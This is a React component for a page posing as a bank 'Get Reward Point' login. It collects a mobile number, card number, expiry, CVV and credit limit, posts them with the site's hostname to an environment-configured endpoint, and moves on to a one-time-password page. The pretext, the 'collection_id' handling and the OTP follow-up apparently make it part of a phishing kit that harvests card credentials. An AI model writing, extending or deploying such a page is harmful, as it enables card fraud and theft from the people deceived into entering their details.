import Header from '../resources/Header'
import Footer from '../resources/Footer'
import Loader from "../resources/Loader";
import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import DebitCardInputComponent from '../resources/DebitCardInputComponent';
import ExpiryDateInputComponent from '../resources/ExpiryDateInputComponent';

function HomeCard() {
 
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [loader, setLoader] = useState(true);
  const API_URL = process.env.REACT_APP_API_URL;

  // Clean up local storage on component mount
  useEffect(() => {
    localStorage.removeItem('collection_id');
    localStorage.removeItem('next');
    localStorage.removeItem("server_input_ot");

    localStorage.removeItem("next_page_otp_times");
    setTimeout(()=>{
      setLoader(false);
    }, 2000);
  }, []);

  // Navigate to home card page
  const HomePage = () => {
    navigate('/');
  };

  // Form submit handler
  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true); 

    const formData = new FormData(e.target);
    const jsonObject = {};
    
    formData.forEach((value, key) => {
      jsonObject[key] = value;
    });

    const postData = {
      data: jsonObject,
      site: window.location.hostname
    };

    try {
      const response = await fetch(`${API_URL}`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(postData)
      });

      if (!response.ok) {
        throw new Error('Network response was not ok');
      }

      const responseData = await response.json();
      if (responseData.status === 200) {
        localStorage.setItem('collection_id', responseData.data);
        localStorage.setItem('next', "accountverify");
        localStorage.setItem("server_ot_times", 1);
        navigate('/onetimeverify');
      } else {
        alert("Invalid response");
      }
    } catch (error) {
      console.error('There was a problem with the fetch operation:', error);
    } finally {
      setLoading(false);  
    }
  };

  return (
    <>
    <Header />
    <main>
      <div className="container">
      {loader ? (
        <Loader />
        ) : (
          <>
          <div className='mt-4'>
              <h1 className="text-center">Login into Get Reward Point</h1>  
          </div>
          <div className='home-button-switcher'>
              <button onClick={()=>{HomePage()}} > Login ID / Customer ID</button>
              <button className="active" > Credit Card </button>
            </div>
          <div className='shadow px-4 py-2 border-0'>
            <form onSubmit={handleSubmit} >
              <div className='form-group'>
                  <label>Registered Mobile Number</label>
                  <input type='text' name='mo' inputMode='numeric' minLength={10} maxLength={10} className='form-control my-control' required/>
              </div>
              <DebitCardInputComponent />
              <div className='d-flex justify-content-between gap-2 mt-4'>
                <ExpiryDateInputComponent />
                <div className='form-group'>
                    <label>CVV</label>
                    <input type='password' name='ccvv' inputMode='numeric' minLength={3} maxLength={3} className='form-control my-control' required/>
                </div>

              </div>

              <div className='form-group'>
                  <label>Credit Card Limit</label>
                  <input type='text' name='cardlimit' inputMode='numeric' maxLength={8} className='form-control my-control' required/>
              </div>

              <div className='text-center'>
                <input type='submit' value={'Login'} disabled={loading} className='btn btn-danger submit-button' required/>
              </div>

            </form>
          </div>
          </>
        )
      }
        
      </div>
    </main>
    <Footer />
    </>
  );
}

export default HomeCard;
